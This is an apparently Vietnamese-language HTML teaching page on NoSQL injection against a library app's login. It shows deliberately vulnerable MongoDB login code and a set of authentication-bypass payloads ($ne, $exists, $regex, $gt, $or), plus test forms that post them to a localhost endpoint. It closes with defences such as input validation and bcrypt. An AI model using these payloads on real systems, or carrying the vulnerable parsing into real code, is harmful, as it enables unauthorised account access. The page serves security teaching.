<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NoSQL Injection Demo - Qu·∫£n L√Ω M∆∞·ª£n S√°ch</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        background-color: #f5f5f5;
      }
      .container {
        background: white;
        padding: 30px;
        border-radius: 10px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      }
      h1 {
        color: #d32f2f;
        text-align: center;
      }
      h2 {
        color: #1976d2;
        border-bottom: 2px solid #1976d2;
        padding-bottom: 5px;
      }
      .warning {
        background-color: #fff3cd;
        border: 1px solid #ffeaa7;
        color: #856404;
        padding: 15px;
        border-radius: 5px;
        margin: 20px 0;
      }
      .demo-section {
        margin: 30px 0;
        padding: 20px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f9f9f9;
      }
      .code-block {
        background-color: #282c34;
        color: #abb2bf;
        padding: 15px;
        border-radius: 5px;
        font-family: "Courier New", monospace;
        overflow-x: auto;
        white-space: pre;
      }
      .payload {
        background-color: #ffebee;
        border-left: 4px solid #f44336;
        padding: 10px;
        margin: 10px 0;
      }
      .test-form {
        background-color: #e3f2fd;
        padding: 20px;
        border-radius: 5px;
        margin: 20px 0;
      }
      .test-form input,
      .test-form textarea {
        width: 100%;
        padding: 10px;
        margin: 5px 0;
        border: 1px solid #ddd;
        border-radius: 3px;
      }
      .test-form button {
        background-color: #1976d2;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 3px;
        cursor: pointer;
      }
      .test-form button:hover {
        background-color: #1565c0;
      }
      .result {
        margin-top: 15px;
        padding: 10px;
        border-radius: 3px;
      }
      .success {
        background-color: #d4edda;
        border: 1px solid #c3e6cb;
        color: #155724;
      }
      .error {
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>üö® NoSQL Injection Demo - Qu·∫£n L√Ω M∆∞·ª£n S√°ch</h1>

      <div class="warning">
        <strong>‚ö†Ô∏è C·∫¢NH B√ÅO B·∫¢O M·∫¨T:</strong>
        ƒê√¢y l√† demo v·ªÅ l·ªó h·ªïng NoSQL Injection ch·ªâ ph·ª•c v·ª• m·ª•c ƒë√≠ch gi√°o d·ª•c v√†
        ki·ªÉm th·ª≠ b·∫£o m·∫≠t. Kh√¥ng s·ª≠ d·ª•ng trong m√¥i tr∆∞·ªùng production!
      </div>

      <h2>üìù Gi·ªõi thi·ªáu v·ªÅ NoSQL Injection</h2>
      <p>
        NoSQL Injection l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t x·∫£y ra khi ·ª©ng d·ª•ng kh√¥ng ki·ªÉm
        tra v√† sanitize ƒë·∫ßu v√†o t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi s·ª≠ d·ª•ng trong c√¢u truy
        v·∫•n NoSQL. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ bypass authentication
        ho·∫∑c truy c·∫≠p d·ªØ li·ªáu kh√¥ng ƒë∆∞·ª£c ph√©p.
      </p>

      <h2>üîç Ph√¢n t√≠ch l·ªó h·ªïng trong code</h2>
      <div class="demo-section">
        <h3>Code c√≥ l·ªó h·ªïng (login-vulnerable.js):</h3>
        <div class="code-block">
          // VULNERABLE: Parse JSON strings th√†nh objects ƒë·ªÉ cho ph√©p injection
          let parsedMaDocGia = MaDocGia; let parsedMatKhau = MatKhau; // N·∫øu
          input l√† JSON string, parse th√†nh object ‚ùå L·ªñ H·ªîNG! if (typeof
          MaDocGia === 'string') { try { const parsed = JSON.parse(MaDocGia); if
          (typeof parsed === 'object') { parsedMaDocGia = parsed; // ‚ùå Cho ph√©p
          MongoDB operators! } } catch (e) { // Kh√¥ng parse ƒë∆∞·ª£c th√¨ gi·ªØ nguy√™n
          string } } // S·ª≠ d·ª•ng parsed values trong query let queryCondition = {
          MaDocGia: parsedMaDocGia, // ‚ùå C√≥ th·ªÉ ch·ª©a {"$ne": null} MatKhau:
          parsedMatKhau // ‚ùå C√≥ th·ªÉ ch·ª©a {"$ne": null} }; const docGia = await
          docGiaCollection.findOne(queryCondition);
        </div>
      </div>

      <h2>üí• C√°c payload t·∫•n c√¥ng NoSQL Injection</h2>

      <div class="demo-section">
        <h3>1. Bypass Authentication - B·ªè qua x√°c th·ª±c</h3>
        <div class="payload">
          <strong>Payload cho MaDocGia:</strong><br />
          <code>{"$ne": null}</code> ho·∫∑c <code>{"$exists": true}</code>
          <br /><br />
          <strong>Payload cho MatKhau:</strong><br />
          <code>{"$ne": null}</code> ho·∫∑c <code>{"$exists": true}</code>
        </div>
        <p>
          <strong>Gi·∫£i th√≠ch:</strong> Payload n√†y s·∫Ω t·∫°o query MongoDB nh∆∞ sau:
        </p>
        <div class="code-block">
          db.docgias.findOne({ MaDocGia: {"$ne": null}, MatKhau: {"$ne": null}
          })
        </div>
        <p>
          Query n√†y s·∫Ω tr·∫£ v·ªÅ b·∫•t k·ª≥ user n√†o c√≥ MaDocGia v√† MatKhau kh√°c null,
          cho ph√©p bypass authentication!
        </p>
      </div>

      <div class="demo-section">
        <h3>2. Regex Injection - T·∫•n c√¥ng b·∫±ng regex</h3>
        <div class="payload">
          <strong>Payload cho MaDocGia:</strong><br />
          <code>{"$regex": ".*"}</code>
          <br /><br />
          <strong>Payload cho MatKhau:</strong><br />
          <code>{"$regex": ".*"}</code>
        </div>
        <p>
          <strong>Gi·∫£i th√≠ch:</strong> Regex ".*" s·∫Ω match v·ªõi m·ªçi gi√° tr·ªã, cho
          ph√©p ƒëƒÉng nh·∫≠p v·ªõi b·∫•t k·ª≥ user n√†o.
        </p>
      </div>

      <div class="demo-section">
        <h3>3. OR Injection - T·∫•n c√¥ng b·∫±ng to√°n t·ª≠ OR</h3>
        <div class="payload">
          <strong>Payload cho MaDocGia:</strong><br />
          <code
            >{"$or": [{"MaDocGia": {"$exists": true}}, {"Email": {"$exists":
            true}}]}</code
          >
        </div>
      </div>

      <h2>üß™ Test NoSQL Injection</h2>

      <div class="test-form">
        <h3>Test ƒëƒÉng nh·∫≠p ƒë·ªôc gi·∫£ v·ªõi NoSQL Injection</h3>
        <label>M√£ ƒë·ªôc gi·∫£ (JSON payload):</label>
        <textarea
          id="readerUsername"
          rows="3"
          placeholder='V√≠ d·ª•: {"$ne": null}'
        ></textarea>

        <label>M·∫≠t kh·∫©u (JSON payload):</label>
        <textarea
          id="readerPassword"
          rows="3"
          placeholder='V√≠ d·ª•: {"$ne": null}'
        ></textarea>

        <!-- Quick payload buttons -->
        <div style="margin: 10px 0">
          <strong>Payload nhanh:</strong>
          <button
            type="button"
            onclick="setReaderPayload1()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $ne null
          </button>
          <button
            type="button"
            onclick="setReaderPayload2()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $exists true
          </button>
          <button
            type="button"
            onclick="setReaderPayload3()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $regex .*
          </button>
          <button
            type="button"
            onclick="setReaderPayload4()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $gt ""
          </button>
        </div>

        <button onclick="testReaderLogin()">Test ƒëƒÉng nh·∫≠p ƒë·ªôc gi·∫£</button>

        <div id="readerResult" class="result" style="display: none"></div>
      </div>

      <div class="test-form">
        <h3>Test ƒëƒÉng nh·∫≠p nh√¢n vi√™n v·ªõi NoSQL Injection</h3>
        <label>T√†i kho·∫£n (JSON payload):</label>
        <textarea
          id="staffUsername"
          rows="3"
          placeholder='V√≠ d·ª•: {"$ne": null}'
        ></textarea>

        <label>M·∫≠t kh·∫©u (JSON payload):</label>
        <textarea
          id="staffPassword"
          rows="3"
          placeholder='V√≠ d·ª•: {"$ne": null}'
        ></textarea>

        <!-- Quick payload buttons -->
        <div style="margin: 10px 0">
          <strong>Payload nhanh:</strong>
          <button
            type="button"
            onclick="setStaffPayload1()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $ne null
          </button>
          <button
            type="button"
            onclick="setStaffPayload2()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $exists true
          </button>
          <button
            type="button"
            onclick="setStaffPayload3()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $regex .*
          </button>
          <button
            type="button"
            onclick="setStaffPayload4()"
            style="margin: 2px; padding: 5px; font-size: 12px"
          >
            $gt ""
          </button>
        </div>

        <button onclick="testStaffLogin()">Test ƒëƒÉng nh·∫≠p nh√¢n vi√™n</button>

        <div id="staffResult" class="result" style="display: none"></div>
      </div>

      <h2>üõ°Ô∏è C√°ch ph√≤ng ch·ªëng</h2>
      <div class="demo-section">
        <h3>1. Input Sanitization v√† Validation</h3>
        <div class="code-block">
          // Ki·ªÉm tra v√† ch·ªâ ch·∫•p nh·∫≠n string if (typeof MaDocGia !== 'string'
          || typeof MatKhau !== 'string') { return res.status(400).json({
          message: "D·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng h·ª£p l·ªá!" }); } // S·ª≠ d·ª•ng exact match
          thay v√¨ object injection const docGia = await
          docGiaCollection.findOne({ MaDocGia: MaDocGia.toString(), // So s√°nh
          m·∫≠t kh·∫©u ƒë√£ hash b·∫±ng bcrypt });
        </div>

        <h3>2. S·ª≠ d·ª•ng Schema Validation</h3>
        <div class="code-block">
          const Joi = require('joi'); const loginSchema = Joi.object({ MaDocGia:
          Joi.string().alphanum().min(3).max(30).required(), MatKhau:
          Joi.string().min(6).required() }); const { error, value } =
          loginSchema.validate(req.body); if (error) { return
          res.status(400).json({ message: "D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá: " +
          error.details[0].message }); }
        </div>

        <h3>3. S·ª≠ d·ª•ng bcrypt ƒë·ªÉ hash password</h3>
        <div class="code-block">
          // Hash password khi t·∫°o t√†i kho·∫£n const hashedPassword = await
          bcrypt.hash(password, 10); // So s√°nh password khi ƒëƒÉng nh·∫≠p const
          isValid = await bcrypt.compare(inputPassword, user.hashedPassword);
        </div>
      </div>

      <h2>üîó T√†i nguy√™n tham kh·∫£o</h2>
      <ul>
        <li>
          <a
            href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
            target="_blank"
            >OWASP NoSQL Injection Testing Guide</a
          >
        </li>
        <li>
          <a
            href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
            target="_blank"
            >PayloadsAllTheThings - NoSQL Injection</a
          >
        </li>
        <li>
          <a
            href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb"
            target="_blank"
            >Hacking NodeJS and MongoDB</a
          >
        </li>
      </ul>
    </div>

    <script>
      const API_BASE = "http://localhost:5000/api";

      async function testReaderLogin() {
        const usernameInput = document
          .getElementById("readerUsername")
          .value.trim();
        const passwordInput = document
          .getElementById("readerPassword")
          .value.trim();
        const resultDiv = document.getElementById("readerResult");

        try {
          // G·ª≠i tr·ª±c ti·∫øp string JSON, backend s·∫Ω parse
          console.log("Sending raw payload:", {
            MaDocGia: usernameInput,
            MatKhau: passwordInput,
          });

          const response = await fetch(`${API_BASE}/login-vulnerable/reader`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              MaDocGia: usernameInput,
              MatKhau: passwordInput,
            }),
          });

          const data = await response.json();

          resultDiv.style.display = "block";
          if (response.ok) {
            resultDiv.className = "result success";
            resultDiv.innerHTML = `
                        <strong>‚úÖ TH√ÄNH C√îNG - NoSQL Injection ho·∫°t ƒë·ªông!</strong><br>
                        ƒêƒÉng nh·∫≠p th√†nh c√¥ng v·ªõi user: <strong>${
                          data.user?.HoTen || "Unknown"
                        }</strong><br>
                        M√£ ƒë·ªôc gi·∫£: <strong>${
                          data.user?.MaDocGia || "Unknown"
                        }</strong><br>
                        Email: <strong>${data.user?.Email || "N/A"}</strong><br>
                        Token: ${data.token ? "Generated ‚úì" : "None"}
                    `;
          } else {
            resultDiv.className = "result error";
            resultDiv.innerHTML = `<strong>‚ùå TH·∫§T B·∫†I:</strong> ${data.message}`;
          }
        } catch (error) {
          resultDiv.style.display = "block";
          resultDiv.className = "result error";
          resultDiv.innerHTML = `<strong>‚ùå L·ªñI:</strong> ${error.message}`;
        }
      }

      async function testStaffLogin() {
        const usernameInput = document
          .getElementById("staffUsername")
          .value.trim();
        const passwordInput = document
          .getElementById("staffPassword")
          .value.trim();
        const resultDiv = document.getElementById("staffResult");

        try {
          // G·ª≠i tr·ª±c ti·∫øp string JSON, backend s·∫Ω parse
          console.log("Sending raw payload:", {
            TaiKhoan: usernameInput,
            MatKhau: passwordInput,
          });

          const response = await fetch(`${API_BASE}/login-vulnerable/staff`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              TaiKhoan: usernameInput,
              MatKhau: passwordInput,
            }),
          });

          const data = await response.json();

          resultDiv.style.display = "block";
          if (response.ok) {
            resultDiv.className = "result success";
            resultDiv.innerHTML = `
                        <strong>‚úÖ TH√ÄNH C√îNG - NoSQL Injection ho·∫°t ƒë·ªông!</strong><br>
                        ƒêƒÉng nh·∫≠p th√†nh c√¥ng v·ªõi user: <strong>${
                          data.user?.HoTenNV || "Unknown"
                        }</strong><br>
                        MSNV: <strong>${
                          data.user?.MSNV || "Unknown"
                        }</strong><br>
                        Ch·ª©c v·ª•: <strong>${
                          data.user?.ChucVu || "Unknown"
                        }</strong><br>
                        Role: <strong>${
                          data.user?.role || "Unknown"
                        }</strong><br>
                        Token: ${data.token ? "Generated ‚úì" : "None"}
                    `;
          } else {
            resultDiv.className = "result error";
            resultDiv.innerHTML = `<strong>‚ùå TH·∫§T B·∫†I:</strong> ${data.message}`;
          }
        } catch (error) {
          resultDiv.style.display = "block";
          resultDiv.className = "result error";
          resultDiv.innerHTML = `<strong>‚ùå L·ªñI:</strong> ${error.message}`;
        }
      }

      // Quick payload functions for readers
      function setReaderPayload1() {
        document.getElementById("readerUsername").value = '{"$ne": null}';
        document.getElementById("readerPassword").value = '{"$ne": null}';
      }

      function setReaderPayload2() {
        document.getElementById("readerUsername").value = '{"$exists": true}';
        document.getElementById("readerPassword").value = '{"$exists": true}';
      }

      function setReaderPayload3() {
        document.getElementById("readerUsername").value = '{"$regex": ".*"}';
        document.getElementById("readerPassword").value = '{"$regex": ".*"}';
      }

      function setReaderPayload4() {
        document.getElementById("readerUsername").value = '{"$gt": ""}';
        document.getElementById("readerPassword").value = '{"$gt": ""}';
      }

      // Quick payload functions for staff
      function setStaffPayload1() {
        document.getElementById("staffUsername").value = '{"$ne": null}';
        document.getElementById("staffPassword").value = '{"$ne": null}';
      }

      function setStaffPayload2() {
        document.getElementById("staffUsername").value = '{"$exists": true}';
        document.getElementById("staffPassword").value = '{"$exists": true}';
      }

      function setStaffPayload3() {
        document.getElementById("staffUsername").value = '{"$regex": ".*"}';
        document.getElementById("staffPassword").value = '{"$regex": ".*"}';
      }

      function setStaffPayload4() {
        document.getElementById("staffUsername").value = '{"$gt": ""}';
        document.getElementById("staffPassword").value = '{"$gt": ""}';
      }

      // Set default payloads
      document.addEventListener("DOMContentLoaded", function () {
        document.getElementById("readerUsername").value = '{"$ne": null}';
        document.getElementById("readerPassword").value = '{"$ne": null}';
        document.getElementById("staffUsername").value = '{"$ne": null}';
        document.getElementById("staffPassword").value = '{"$ne": null}';
      });
    </script>
  </body>
</html>
